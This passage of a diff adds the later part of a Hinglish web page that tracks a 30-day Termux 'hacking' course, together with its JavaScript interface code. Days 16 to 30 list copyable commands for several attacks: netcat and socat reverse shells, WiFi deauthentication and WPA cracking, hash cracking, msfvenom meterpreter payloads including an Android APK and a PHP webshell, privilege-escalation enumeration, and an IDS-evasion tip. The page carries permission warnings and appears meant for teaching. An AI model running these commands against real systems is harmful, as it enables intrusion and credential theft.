+      { cmd: 'python3 scraper.py', comment: '// apna scraper run karo' },
+    ],
+    tip: '💡 User-Agent header set karo detection avoid karne ke liye.',
+    warn: null
+  },
+  {
+    day: 16, level: 'advanced',
+    title: 'Tor & Anonymity in Termux',
+    subtitle: 'Anonymize traffic, .onion access',
+    desc: 'Tor network se anonymous browsing, traffic route karna seekhenge.',
+    commands: [
+      { cmd: 'pkg install tor', comment: '// tor install karo' },
+      { cmd: 'tor &', comment: '// tor background mein start karo' },
+      { cmd: 'pkg install torsocks', comment: '// torsocks install karo' },
+      { cmd: 'torsocks curl https://check.torproject.org', comment: '// tor check karo' },
+      { cmd: 'torsocks wget http://3g2upl4pq6kufc4m.onion', comment: '// .onion site access' },
+      { cmd: 'curl --socks5 127.0.0.1:9050 https://ifconfig.me', comment: '// SOCKS5 proxy test' },
+      { cmd: 'cat /etc/tor/torrc', comment: '// tor config dekho' },
+      { cmd: 'killall tor', comment: '// tor stop karo' },
+    ],
+    tip: '💡 proxychains bhi use kar sakte ho tor ke saath.',
+    warn: '⚠️ Tor slow hota hai — patience rakho!'
+  },
+  {
+    day: 17, level: 'advanced',
+    title: 'Aircrack-ng — WiFi Security',
+    subtitle: 'Monitor mode, packet injection',
+    desc: 'WiFi security testing — aircrack-ng suite se WPA/WEP testing (root/kali needed).',
+    commands: [
+      { cmd: 'pkg install aircrack-ng', comment: '// aircrack install karo' },
+      { cmd: 'airmon-ng start wlan0', comment: '// monitor mode start karo' },
+      { cmd: 'airodump-ng wlan0mon', comment: '// nearby networks scan karo' },
+      { cmd: 'airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon', comment: '// handshake capture karo' },
+      { cmd: 'aireplay-ng --deauth 10 -a BSSID wlan0mon', comment: '// deauth attack' },
+      { cmd: 'aircrack-ng capture.cap -w wordlist.txt', comment: '// WPA crack karo' },
+      { cmd: 'airmon-ng stop wlan0mon', comment: '// monitor mode stop karo' },
+    ],
+    tip: '💡 External WiFi adapter chahiye hoga monitor mode ke liye.',
+    warn: '⚠️ Sirf apne router pe test karo — illegal otherwise!'
+  },
+  {
+    day: 18, level: 'advanced',
+    title: 'Reverse Shell & Listeners',
+    subtitle: 'netcat, socat reverse shells',
+    desc: 'Netcat aur socat se reverse shell connections, listeners setup karna seekhenge.',
+    commands: [
+      { cmd: 'pkg install netcat-openbsd', comment: '// netcat install karo' },
+      { cmd: 'nc -lvp 4444', comment: '// listener start karo port 4444' },
+      { cmd: 'nc 192.168.1.1 4444 -e /bin/bash', comment: '// reverse shell bhejo' },
+      { cmd: 'pkg install socat', comment: '// socat install karo' },
+      { cmd: 'socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash', comment: '// socat bind shell' },
+      { cmd: 'socat TCP:192.168.1.1:4444 EXEC:/bin/bash', comment: '// socat reverse shell' },
+      { cmd: 'nc -zv 192.168.1.1 1-1000', comment: '// port scan via netcat' },
+      { cmd: 'echo "test" | nc 192.168.1.1 9999', comment: '// data send karo' },
+    ],
+    tip: '💡 Lab environment mein 2 devices pe test karo.',
+    warn: '⚠️ Production systems pe never use karo!'
+  },
+  {
+    day: 19, level: 'advanced',
+    title: 'Nikto — Web Vulnerability Scanner',
+    subtitle: 'Web server scanning & CVE detection',
+    desc: 'Nikto se web servers ki vulnerabilities, outdated software, misconfigs detect karna.',
+    commands: [
+      { cmd: 'pkg install perl', comment: '// perl chahiye nikto ke liye' },
+      { cmd: 'git clone https://github.com/sullo/nikto', comment: '// nikto download karo' },
+      { cmd: 'perl nikto.pl -h http://192.168.1.1', comment: '// basic scan karo' },
+      { cmd: 'perl nikto.pl -h http://site.com -port 443 -ssl', comment: '// HTTPS scan' },
+      { cmd: 'perl nikto.pl -h http://site.com -o report.txt', comment: '// report save karo' },
+      { cmd: 'perl nikto.pl -h http://site.com -Tuning 1', comment: '// SQL injection check' },
+      { cmd: 'perl nikto.pl -h http://site.com -C all', comment: '// all CGI tests' },
+    ],
+    tip: '💡 -evasion flag se IDS bypass try kar sakte ho.',
+    warn: '⚠️ Only on servers you have permission to test!'
+  },
+  {
+    day: 20, level: 'advanced',
+    title: 'John the Ripper — Hash Cracking',
+    subtitle: 'MD5, SHA1, NTLM, bcrypt cracking',
+    desc: 'John the Ripper se password hashes crack karna, rainbow tables, wordlists use karna.',
+    commands: [
+      { cmd: 'pkg install john', comment: '// john install karo' },
+      { cmd: 'echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt', comment: '// hash file banao' },
+      { cmd: 'john hash.txt', comment: '// auto-detect crack karo' },
+      { cmd: 'john --wordlist=/path/rockyou.txt hash.txt', comment: '// wordlist se crack karo' },
+      { cmd: 'john --format=md5 hash.txt', comment: '// MD5 specifically' },
+      { cmd: 'john --show hash.txt', comment: '// cracked passwords dekho' },
+      { cmd: 'john --rules hash.txt', comment: '// rules-based attack' },
+      { cmd: 'hashid hash.txt', comment: '// hash type identify karo' },
+    ],
+    tip: '💡 hashcat GPU ke saath faster hai John se.',
+    warn: '⚠️ Only crack hashes you own or have permission!'
+  },
+  {
+    day: 21, level: 'advanced',
+    title: 'Custom Payload Generation — MSFvenom',
+    subtitle: 'APK, EXE, PHP payloads',
+    desc: 'Msfvenom se custom payloads generate karna, different platforms ke liye.',
+    commands: [
+      { cmd: 'msfvenom -l payloads', comment: '// available payloads dekho' },
+      { cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -o hack.apk', comment: '// Android APK payload' },
+      { cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > payload.exe', comment: '// Windows EXE payload' },
+      { cmd: 'msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw > shell.php', comment: '// PHP webshell' },
+      { cmd: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf > shell', comment: '// Linux ELF binary' },
+      { cmd: 'msfvenom -p windows/exec CMD=calc.exe -f exe > calc.exe', comment: '// simple test payload' },
+    ],
+    tip: '💡 Lab mein virtual machines pe test karo.',
+    warn: '⚠️ Real devices pe deploy karna serious crime hai!'
+  },
+  {
+    day: 22, level: 'advanced',
+    title: 'Linux Privilege Escalation',
+    subtitle: 'SUID, sudo, kernel exploits',
+    desc: 'Low privilege user se root access gain karna — common vectors seekhenge.',
+    commands: [
+      { cmd: 'sudo -l', comment: '// sudo permissions dekho' },
+      { cmd: 'find / -perm -4000 2>/dev/null', comment: '// SUID files dhundho' },
+      { cmd: 'find / -writable -type f 2>/dev/null', comment: '// writable files' },
+      { cmd: 'cat /etc/passwd', comment: '// user accounts dekho' },
+      { cmd: 'cat /etc/crontab', comment: '// cron jobs dekho' },
+      { cmd: 'uname -a', comment: '// kernel version dekho' },
+      { cmd: 'ps aux', comment: '// running processes dekho' },
+      { cmd: 'env', comment: '// environment variables dekho' },
+    ],
+    tip: '💡 LinPEAS script se automated privesc check kar sakte ho.',
+    warn: '⚠️ Practice sirf CTF/lab VMs pe karo!'
+  },
+  {
+    day: 23, level: 'advanced',
+    title: 'Custom Termux Tools & Aliases',
+    subtitle: 'Automate your workflow',
+    desc: 'Apna custom toolset banana — aliases, functions, .bashrc customize karna.',
+    commands: [
+      { cmd: 'nano ~/.bashrc', comment: '// bashrc file edit karo' },
+      { cmd: "alias update='pkg update && pkg upgrade -y'", comment: '// update alias banao' },
+      { cmd: "alias myip='curl ifconfig.me'", comment: '// IP alias banao' },
+      { cmd: "alias ll='ls -la --color=auto'", comment: '// better ls alias' },
+      { cmd: 'source ~/.bashrc', comment: '// changes reload karo' },
+      { cmd: 'nano ~/.bash_profile', comment: '// login shell config' },
+      { cmd: 'export PATH=$PATH:~/bin', comment: '// custom bin folder add karo' },
+      { cmd: "function scan() { nmap -sV $1; }", comment: '// custom function banao' },
+    ],
+    tip: '💡 ~/.termux/termux.properties mein colors customize kar sakte ho.',
+    warn: null
+  },
+  {
+    day: 24, level: 'expert',
+    title: 'Kali Linux on Android — Termux',
+    subtitle: 'proot-distro, full Kali setup',
+    desc: 'Termux ke andar full Kali Linux run karna — proot-distro se.',
+    commands: [
+      { cmd: 'pkg install proot-distro', comment: '// proot-distro install karo' },
+      { cmd: 'proot-distro list', comment: '// available distros dekho' },
+      { cmd: 'proot-distro install kali', comment: '// Kali install karo' },
+      { cmd: 'proot-distro login kali', comment: '// Kali mein login karo' },
+      { cmd: 'apt update && apt upgrade -y', comment: '// Kali update karo' },
+      { cmd: 'apt install kali-linux-default', comment: '// default tools install karo' },
+      { cmd: 'apt install kali-tools-top10', comment: '// top 10 hacking tools' },
+      { cmd: 'exit', comment: '// Kali se bahar aao' },
+    ],
+    tip: '💡 VNC setup karke GUI bhi use kar sakte ho Kali ka!',
+    warn: '⚠️ At least 4GB free storage chahiye Kali ke liye.'
+  },
+  {
+    day: 25, level: 'expert',
+    title: 'Burp Suite Alternative — mitmproxy',
+    subtitle: 'HTTPS interception & manipulation',
+    desc: 'mitmproxy se HTTPS traffic intercept karna, requests/responses modify karna.',
+    commands: [
+      { cmd: 'pip install mitmproxy', comment: '// mitmproxy install karo' },
+      { cmd: 'mitmproxy', comment: '// interactive mode start karo' },
+      { cmd: 'mitmdump', comment: '// command line dump mode' },
+      { cmd: 'mitmweb', comment: '// web UI mode (browser mein dekho)' },
+      { cmd: 'mitmproxy -p 8080', comment: '// custom port pe start' },
+      { cmd: 'mitmdump -w traffic.mitm', comment: '// traffic save karo' },
+      { cmd: 'mitmproxy -s script.py', comment: '// custom script use karo' },
+      { cmd: 'mitmdump --ssl-insecure', comment: '// SSL verification skip' },
+    ],
+    tip: '💡 Device ka proxy 127.0.0.1:8080 set karo intercept ke liye.',
+    warn: null
+  },
+  {
+    day: 26, level: 'expert',
+    title: 'Advanced Python Automation',
+    subtitle: 'Socket programming, port scanner',
+    desc: 'Python se network tools banana — custom port scanner, banner grabber, etc.',
+    commands: [
+      { cmd: 'python3 -c "import socket; s=socket.socket(); s.connect((\'google.com\',80)); print(\'Connected\')"', comment: '// basic socket test' },
+      { cmd: 'pip install scapy', comment: '// scapy network library install' },
+      { cmd: 'pip install impacket', comment: '// impacket security library' },
+      { cmd: 'pip install pwntools', comment: '// CTF pwning library' },
+      { cmd: 'pip install paramiko', comment: '// SSH library for Python' },
+      { cmd: 'python3 -m http.server 8080', comment: '// quick HTTP server start karo' },
+      { cmd: 'pip install flask', comment: '// Flask web framework' },
+      { cmd: 'python3 portscanner.py 192.168.1.0/24', comment: '// custom scanner run karo' },
+    ],
+    tip: '💡 Scapy se custom packets craft kar sakte ho.',
+    warn: null
+  },
+  {
+    day: 27, level: 'expert',
+    title: 'OSINT — Open Source Intelligence',
+    subtitle: 'Recon, footprinting, information gathering',
+    desc: 'theHarvester, Shodan, Maltego alternatives se target information gather karna.',
+    commands: [
+      { cmd: 'pip install theHarvester', comment: '// theHarvester install karo' },
+      { cmd: 'theHarvester -d google.com -b all', comment: '// domain recon karo' },
+      { cmd: 'pip install holehe', comment: '// email OSINT tool' },
+      { cmd: 'holehe email@gmail.com', comment: '// email account check karo' },
+      { cmd: 'pkg install whois', comment: '// whois install karo' },
+      { cmd: 'whois example.com', comment: '// domain info dekho' },
+      { cmd: 'dig example.com ANY', comment: '// DNS records dekho' },
+      { cmd: 'nslookup example.com 8.8.8.8', comment: '// DNS lookup' },
+      { cmd: 'pip install photon', comment: '// web crawler OSINT tool' },
+    ],
+    tip: '💡 Shodan.io pe free account banao — powerful OSINT search engine.',
+    warn: null
+  },
+  {
+    day: 28, level: 'expert',
+    title: 'CTF Tools — Forensics & Steganography',
+    subtitle: 'steghide, binwalk, forensics tools',
+    desc: 'CTF competitions ke liye forensics, steganography, binary analysis tools.',
+    commands: [
+      { cmd: 'pkg install binwalk', comment: '// binwalk install karo' },
+      { cmd: 'binwalk file.jpg', comment: '// hidden data check karo' },
+      { cmd: 'binwalk -e file.jpg', comment: '// extract hidden data' },
+      { cmd: 'pkg install steghide', comment: '// steghide install karo' },
+      { cmd: 'steghide embed -cf img.jpg -sf secret.txt', comment: '// text hide karo image mein' },
+      { cmd: 'steghide extract -sf img.jpg', comment: '// hidden text nikalo' },
+      { cmd: 'strings binary_file | head -50', comment: '// binary strings dekho' },
+      { cmd: 'xxd file | head -20', comment: '// hex dump dekho' },
+      { cmd: 'file mystery_file', comment: '// file type detect karo' },
+    ],
+    tip: '💡 CTF ke liye: picoCTF, HackTheBox, TryHackMe join karo.',
+    warn: null
+  },
+  {
+    day: 29, level: 'expert',
+    title: 'Termux API — Phone Sensors & Features',
+    subtitle: 'Camera, SMS, GPS, Contacts',
+    desc: 'Termux:API se phone ke features access karna — camera, GPS, SMS, etc.',
+    commands: [
+      { cmd: 'pkg install termux-api', comment: '// termux-api install karo' },
+      { cmd: 'termux-battery-status', comment: '// battery status JSON mein' },
+      { cmd: 'termux-location', comment: '// GPS location dekho' },
+      { cmd: 'termux-camera-photo photo.jpg', comment: '// photo lo back camera se' },
+      { cmd: 'termux-sms-list -l 10', comment: '// last 10 SMS dekho' },
+      { cmd: 'termux-contacts-list', comment: '// contacts list karo' },
+      { cmd: 'termux-notification --title "H4cker" --content "Owned"', comment: '// notification bhejo' },
+      { cmd: 'termux-tts-speak "System Compromised"', comment: '// text to speech' },
+      { cmd: 'termux-wifi-scaninfo', comment: '// nearby WiFi networks dekho' },
+    ],
+    tip: '💡 Termux:API app bhi install karna padega Play Store se.',
+    warn: null
+  },
+  {
+    day: 30, level: 'expert',
+    title: 'Final Project — Full Recon Automation Script',
+    subtitle: 'Build your own hacking automation tool',
+    desc: 'Sab kuch combine karo — ek complete automated recon & scan script banana.',
+    commands: [
+      { cmd: 'nano recon_master.sh', comment: '// master script banao' },
+      { cmd: '#!/bin/bash\n# Termux Recon Master v1.0\necho "[+] Starting Recon on $1"', comment: '// script header' },
+      { cmd: 'nmap -sV -A $TARGET 2>/dev/null | tee scan.txt', comment: '// nmap scan + save' },
+      { cmd: 'whois $TARGET | tee whois.txt', comment: '// whois + save' },
+      { cmd: 'dig $TARGET ANY | tee dns.txt', comment: '// dns records + save' },
+      { cmd: 'curl -s "https://crt.sh/?q=$TARGET&output=json" | python3 -m json.tool | grep "name_value"', comment: '// subdomains via cert transparency' },
+      { cmd: 'zip -r recon_report.zip *.txt', comment: '// sab results zip karo' },
+      { cmd: 'chmod +x recon_master.sh && ./recon_master.sh example.com', comment: '// script run karo!' },
+    ],
+    tip: '💡 Congratulations! Tu ab Termux ka Master hai! 🎉',
+    warn: '⚠️ Always hack ethically — knowledge ke saath responsibility aati hai!'
+  }
+];
+
+// ═══════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════
+let completed = JSON.parse(localStorage.getItem('termux_completed') || '[]');
+let currentFilter = 'all';
+let searchQuery = '';
+
+// ═══════════════════════════════════════════════
+//  MATRIX RAIN
+// ═══════════════════════════════════════════════
+const canvas = document.getElementById('matrix-canvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+const cols = Math.floor(canvas.width / 20);
+const drops = Array(cols).fill(1);
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(0,0,0,0.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = '#00ff41';
+  ctx.font = '15px Share Tech Mono';
+  const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ';
+  for (let i = 0; i < drops.length; i++) {
+    ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * 20, drops[i] * 20);
+    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix, 50);
+window.addEventListener('resize', () => {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+});
+
+// ═══════════════════════════════════════════════
+//  TYPEWRITER
+// ═══════════════════════════════════════════════
+const cmds = ['./recon_master.sh target.com', 'nmap -sV 192.168.1.0/24', 'python3 exploit.py --target localhost', 'hydra -l root -P rockyou.txt ssh://192.168.1.1', 'msfconsole -q -x "use exploit/multi/handler"'];
+let tIdx = 0, cIdx = 0, deleting = false;
+const tw = document.getElementById('typewriter');
+function type() {
+  const current = cmds[tIdx];
+  if (!deleting) {
+    tw.textContent = current.slice(0, ++cIdx);
+    if (cIdx === current.length) { deleting = true; setTimeout(type, 2000); return; }
+  } else {
+    tw.textContent = current.slice(0, --cIdx);
+    if (cIdx === 0) { deleting = false; tIdx = (tIdx + 1) % cmds.length; }
+  }
+  setTimeout(type, deleting ? 40 : 80);
+}
+type();
+
+// ═══════════════════════════════════════════════
+//  RENDER
+// ═══════════════════════════════════════════════
+function updateProgress() {
+  const done = completed.length;
+  const pct = Math.round((done / 30) * 100);
+  document.getElementById('progress-bar').style.width = pct + '%';
+  document.getElementById('progress-pct').textContent = pct + '%';
+  document.getElementById('stat-done').textContent = done;
+  document.getElementById('stat-left').textContent = 30 - done;
+  // streak
+  let streak = 0;
+  for (let i = 1; i <= 30; i++) {
+    if (completed.includes(i)) streak++;
+    else break;
+  }
+  document.getElementById('stat-streak').textContent = streak;
+}
+
+function renderDays() {
+  const grid = document.getElementById('days-grid');
+  grid.innerHTML = '';
+  const filtered = DAYS.filter(d => {
+    const matchFilter =
+      currentFilter === 'all' ||
+      currentFilter === d.level ||
+      (currentFilter === 'completed' && completed.includes(d.day));
+    const q = searchQuery.toLowerCase();
+    const matchSearch =
+      !q ||
+      d.title.toLowerCase().includes(q) ||
+      d.subtitle.toLowerCase().includes(q) ||
+      d.commands.some(c => c.cmd.toLowerCase().includes(q) || c.comment.toLowerCase().includes(q));
+    return matchFilter && matchSearch;
+  });
+
+  if (filtered.length === 0) {
+    grid.innerHTML = '<div style="text-align:center;color:#1a4a1a;font-size:.9rem;padding:40px;letter-spacing:2px;">[ NO RESULTS FOUND ]</div>';
+    return;
+  }
+
+  filtered.forEach(d => {
+    const isDone = completed.includes(d.day);
+    const card = document.createElement('div');
+    card.className = 'day-card' + (isDone ? ' completed' : '');
+    card.innerHTML = `
+      <div class="day-header">
+        <div class="day-num">DAY ${String(d.day).padStart(2,'0')}</div>
+        <div class="day-meta">
+          <div class="day-title">${d.title}</div>
+          <div class="day-subtitle">${d.subtitle}</div>
+        </div>
+        <div class="day-right">
+          <div class="level-badge ${d.level}">${d.level.toUpperCase()}</div>
+          <button class="check-btn" data-day="${d.day}" title="Mark complete">${isDone ? '✓' : '○'}</button>
+          <div class="expand-icon">▼</div>
+        </div>
+      </div>
+      <div class="day-content">
+        <div class="content-section">
+          <div class="section-label">[ OVERVIEW ]</div>
+          <div class="desc-text">${d.desc}</div>
+        </div>
+        <div class="content-section">
+          <div class="section-label">[ COMMANDS ]</div>
+          <div class="cmd-list">
+            ${d.commands.map(c => `
+              <div class="cmd-item" data-cmd="${c.cmd.replace(/"/g,'&quot;')}">
+                <div class="cmd-text">
+                  <span class="dollar">$</span>${c.cmd}
+                  <span class="comment">${c.comment}</span>
+                </div>
+                <span class="copy-hint">COPY</span>
+              </div>
+            `).join('')}
+          </div>
+        </div>
+        ${d.tip ? `<div class="content-section"><div class="tip-box"><span class="tip-icon">💡</span>${d.tip}</div></div>` : ''}
+        ${d.warn ? `<div class="warn-box">⚠️ ${d.warn}</div>` : ''}
+      </div>
+    `;
+
+    // Toggle expand
+    card.querySelector('.day-header').addEventListener('click', (e) => {
+      if (e.target.closest('.check-btn')) return;
+      card.classList.toggle('open');
+    });
+
+    // Check/uncheck
+    card.querySelector('.check-btn').addEventListener('click', (e) => {
+      e.stopPropagation();
+      const day = parseInt(e.currentTarget.dataset.day);
+      if (completed.includes(day)) {
+        completed = completed.filter(x => x !== day);
+      } else {
+        completed.push(day);
+      }
+      localStorage.setItem('termux_completed', JSON.stringify(completed));
+      renderDays();
+      updateProgress();
+    });
+
+    // Copy command
+    card.querySelectorAll('.cmd-item').forEach(item => {
+      item.addEventListener('click', () => {
+        const cmd = item.dataset.cmd;
+        navigator.clipboard.writeText(cmd).then(() => {
+          const toast = document.getElementById('copy-toast');
+          toast.classList.add('show');
+          setTimeout(() => toast.classList.remove('show'), 2000);
+        }).catch(() => {});
+      });
+    });
+
+    grid.appendChild(card);
+  });
+}
+
+// ═══════════════════════════════════════════════
+//  FILTER TABS
+// ═══════════════════════════════════════════════
+document.querySelectorAll('.filter-tab').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.filter-tab').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    currentFilter = btn.dataset.filter;
+    renderDays();
+  });
+});
+
+// ═══════════════════════════════════════════════
+//  SEARCH
+// ═══════════════════════════════════════════════
+document.getElementById('search-input').addEventListener('input', (e) => {
+  searchQuery = e.target.value;
+  renderDays();
+});
+
+// ═══════════════════════════════════════════════
+//  INIT
+// ═══════════════════════════════════════════════
+renderDays();
+updateProgress();
+</script>
+</body>
+</html>
